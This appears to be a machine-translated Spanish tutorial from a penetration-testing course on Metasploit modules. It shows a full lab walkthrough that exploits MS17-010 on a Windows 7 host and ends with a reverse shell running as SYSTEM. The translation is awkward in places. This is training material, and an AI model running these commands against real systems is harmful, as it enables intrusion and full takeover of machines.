# Módulos

Como mencionamos anteriormente, MetaSploit`modules`son scripts preparados con un propósito específico y funciones correspondientes que ya se han desarrollado y probado en la naturaleza. El`exploit`La categoría consiste en la llamada prueba de concepto (`POCs`) que se pueden utilizar para explotar las vulnerabilidades existentes de manera en gran medida automatizada. Muchas personas a menudo piensan que el fracaso de la exploit refuta la existencia de la sospecha de vulnerabilidad. Sin embargo, esto es solo una prueba de que la exploit de metasploit no funciona y no que la vulnerabilidad no existe. Esto se debe a que muchos exploits requieren personalización de acuerdo con los hosts objetivo para que el exploit funcione. Por lo tanto, las herramientas automatizadas, como el marco de MetaSploit, solo deben considerarse una herramienta de soporte y no un sustituto de nuestras habilidades manuales.

Una vez que estamos en el`msfconsole`, podemos seleccionar entre una lista extensa que contiene todos los módulos de metasploit disponibles. Cada uno de ellos está estructurado en carpetas, que se verán así:

### **Sintaxis**

Módulos

```
<No.> <type>/<os>/<service>/<name>

```

### **Ejemplo**

Módulos

```
794   exploit/windows/ftp/scriptftp_list

```

### **Índice No.**

El`No.`La etiqueta se mostrará para seleccionar el exploit que queremos después durante nuestras búsquedas. Veremos lo útil que el`No.`La etiqueta puede ser seleccionar módulos de metasploit específicos más adelante.

### **Tipo**

El`Type`La etiqueta es el primer nivel de segregación entre el metasploit`modules`. Mirando este campo, podemos decir qué logrará el código para este módulo. Algunos de estos`types`no son directamente utilizables como un`exploit`El módulo sería, por ejemplo. Sin embargo, están configurados para introducir la estructura junto con las interactables para una mejor modularización. Para explicar mejor, aquí están los posibles tipos que podrían aparecer en este campo:

| **Tipo** | **Descripción** |
| --- | --- |
| `Auxiliary` | Escaneo, confuso, olfateo y capacidades de administración. Ofrecer asistencia y funcionalidad adicionales. |
| `Encoders` | Asegúrese de que las cargas útiles estén intactas para su destino. |
| `Exploits` | Definido como módulos que explotan una vulnerabilidad que permitirá la entrega de la carga útil. |
| `NOPs` | (Sin código de operación) Mantenga los tamaños de carga útil consistentes en los intentos de exploit. |
| `Payloads` | El código se ejecuta de forma remota y vuelve a llamar a la máquina del atacante para establecer una conexión (o shell). |
| `Plugins` | Se pueden integrar scripts adicionales dentro de una evaluación con`msfconsole`y coexistir. |
| `Post` | Amplia gama de módulos para recopilar información, pivote más profundo, etc. |

Tenga en cuenta que al seleccionar un módulo para usar para la entrega de carga útil, el`use <no.>`El comando solo se puede usar con los siguientes módulos que se pueden usar como`initiators`(o módulos interactables):

| **Tipo** | **Descripción** |
| --- | --- |
| `Auxiliary` | Escaneo, confuso, olfateo y capacidades de administración. Ofrecer asistencia y funcionalidad adicionales. |
| `Exploits` | Definido como módulos que explotan una vulnerabilidad que permitirá la entrega de la carga útil. |
| `Post` | Amplia gama de módulos para recopilar información, pivote más profundo, etc. |

### **Sistema operativo**

El`OS`La etiqueta especifica para qué sistema operativo y arquitectura se creó el módulo. Naturalmente, los diferentes sistemas operativos requieren que se ejecute un código diferente para obtener los resultados deseados.

### **Servicio**

El`Service`La etiqueta se refiere al servicio vulnerable que se ejecuta en la máquina de destino. Para algunos módulos, como el`auxiliary`o`post`los que esta etiqueta puede referirse a una actividad más general, como`gather`, refiriéndose a la recopilación de credenciales, por ejemplo.

### **Nombre**

Finalmente, el`Name`TAG explica la acción real que se puede realizar utilizando este módulo creado para un propósito específico.

---

# **Buscando módulos**

Metasploit también ofrece una función de búsqueda bien desarrollada para los módulos existentes. Con la ayuda de esta función, podemos buscar rápidamente todos los módulos utilizando`tags`para encontrar uno adecuado para nuestro objetivo.

### **MSF - función de búsqueda**

Módulos

```
msf6 > help search

Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                   Show this help information
  -o <file>            Send output to a file in csv format
  -S <string>          Regex pattern used to filter search results
  -u                   Use module if there is one result
  -s <search_column>   Sort the research results based on <search_column> in ascending order
  -r                   Reverse the search results order to descending order

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r

```

Por ejemplo, podemos intentar encontrar el`EternalRomance`Explotación para sistemas operativos de Windows más antiguos. Esto podría verse algo así:

---

### **MSF - Buscando la eternalomancia**

Módulos

```
msf6 > search eternalromance

Matching Modules
================

#  Name                                  Disclosure Date  Rank    Check  Description   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

msf6 > search eternalromance type:exploit

Matching Modules
================

#  Name                                  Disclosure Date  Rank    Check  Description   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

```

También podemos hacer que nuestra búsqueda sea un poco más gruesa y reducirla a una categoría de servicios. Por ejemplo, para el CVE, podríamos especificar el año (`cve:<year>`), las ventanas de la plataforma (`platform:<os>`), el tipo de módulo que queremos encontrar (`type:<auxiliary/exploit/post>`), el rango de confiabilidad (`rank:<rank>`), y el nombre de búsqueda (`<pattern>`). Esto reduciría nuestros resultados a solo aquellos que coincidan con todo lo anterior.

### **MSF - Búsqueda específica**

Módulos

```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

Matching Modules
================

#  Name                                            Disclosure Date  Rank       Check  Description   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE

```

---

# **Selección de módulos**

Para seleccionar nuestro primer módulo, primero necesitamos encontrar uno. Supongamos que tenemos un objetivo que ejecuta una versión de SMB vulnerable a las exploits Eternalomance (MS17_010). Hemos descubierto que el puerto del servidor SMB 445 está abierto al escanear el destino.

Módulos

```
xnoxos@htb[/htb]$ nmap -sV 10.10.10.40Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.40
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds

```

Nos arrancaríamos`msfconsole`y busque este nombre exacto de exploit.

### **MSF - Busque MS17_010**

Módulos

```
msf6 > search ms17_010

Matching Modules
================

#  Name                                      Disclosure Date  Rank     Check  Description   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

```

A continuación, queremos seleccionar el módulo apropiado para este escenario. Desde`Nmap`escanear, hemos detectado el servicio SMB ejecutándose en la versión`Microsoft Windows 7 - 10`. Con una escaneo adicional del sistema operativo, podemos suponer que este es un Windows 7 que ejecuta una instancia vulnerable de SMB. Luego procedemos a seleccionar el módulo con el`index no. 2`Probar si el objetivo es vulnerable.

---

# **Usando módulos**

Dentro de los módulos interactivos, hay varias opciones que podemos especificar. Estos se utilizan para adaptar el módulo MetaSploit al entorno dado. Porque en la mayoría de los casos, siempre necesitamos escanear o atacar diferentes direcciones IP. Por lo tanto, requerimos este tipo de funcionalidad para permitirnos establecer nuestros objetivos y ajustarlos. Para verificar qué opciones se deben configurar antes de que se pueda enviar el exploit al host de destino, podemos usar el`show options`dominio. Todo lo que se debe establecer antes de que pueda ocurrir la explotación tendrá un`Yes`bajo el`Required`columna.

### **MSF - Seleccionar módulo**

Módulos

```
<SNIP>

Matching Modules
================

#  Name                                  Disclosure Date  Rank    Check  Description   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Aquí vemos lo útil que el`No.`Las etiquetas pueden ser. Porque ahora, no tenemos que escribir toda la ruta, sino solo el número asignado al módulo MetaSploit en nuestra búsqueda. Podemos usar el comando`info`Después de seleccionar el módulo si queremos saber algo más sobre el módulo. Esto nos dará una serie de información que puede ser importante para nosotros.

### **MSF - Información del módulo**

Módulos

```
msf6 exploit(windows/smb/ms17_010_psexec) > info

       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                          Required  Description
  ----                  ---------------                          --------  -----------
  DBGTRACE              false                                    yes       Show extra debug trace info
  LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
  NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                        rdlists/named_pipes.txt
  RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                           wiki/Using-Metasploit
  RPORT                 445                                      yes       The Target port (TCP)
  SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                           no        The service display name
  SERVICE_NAME                                                   no        The service name
  SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor                                                                           mal read/write folder share
  SMBDomain             .                                        no        The Windows domain to use for authentication
  SMBPass                                                        no        The password for the specified username
  SMBUser                                                        no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to
  achieve a write-what-where primitive. This will then be used to
  overwrite the connection session information with as an
  Administrator session. From there, the normal psexec payload code
  execution is done. Exploits a type confusion between Transaction and
  WriteAndX requests and a race condition in Transaction requests, as
  seen in the EternalRomance, EternalChampion, and EternalSynergy
  exploits. This exploit chain is more reliable than the EternalBlue
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE

```

Después de estar satisfechos de que el módulo seleccionado es el adecuado para nuestro propósito, necesitamos establecer algunas especificaciones para personalizar el módulo para usarlo con éxito en nuestro host de destino, como configurar el objetivo (`RHOST`o`RHOSTS`).

### **MSF - Especificación de destino**

Módulos

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Además, existe la opción`setg`, que especifica las opciones seleccionadas por nosotros como permanentes hasta que se reinicie el programa. Por lo tanto, si estamos trabajando en un host de destino en particular, podemos usar este comando para configurar la dirección IP una vez y no cambiarla nuevamente hasta que cambiemos nuestro enfoque a una dirección IP diferente.

### **MSF - Especificación de destino permanente**

Módulos

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Finalmente, dado que estamos a punto de usar una carcasa inversa basada en TCP (`/windows/meterpreter/reverse_tcp`) Necesitamos especificar a qué dirección IP debe conectarse para establecer una conexión. Por lo tanto, necesitamos establecer`LHOST`a nuestra propia dirección IP como el siguiente:

### **MSF - Especificación LHOST**

Módulos

```
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOSTS => 10.10.14.15

msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Una vez que todo está configurado y listo para comenzar, podemos proceder a lanzar el ataque. Tenga en cuenta que la carga útil no se estableció aquí, ya que la predeterminada es suficiente para esta demostración.

### **MSF - Exploit Ejecución**

Módulos

```
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter> shell

C:\Windows\system32>

```

Ahora tenemos una carcasa en la máquina de destino, y podemos interactuar con ella.

### **MSF - interacción objetivo**

Módulos

```
C:\Windows\system32> whoami

whoami
nt authority\system

```

Este ha sido un ejemplo rápido y sucio de cómo`msfconsole`Puede ayudar rápidamente, pero sirve como un excelente ejemplo de cómo funciona el marco. Solo se necesitaba un módulo sin ningún`payload`selección,`encoding`o`pivoting`entre sesiones o trabajos.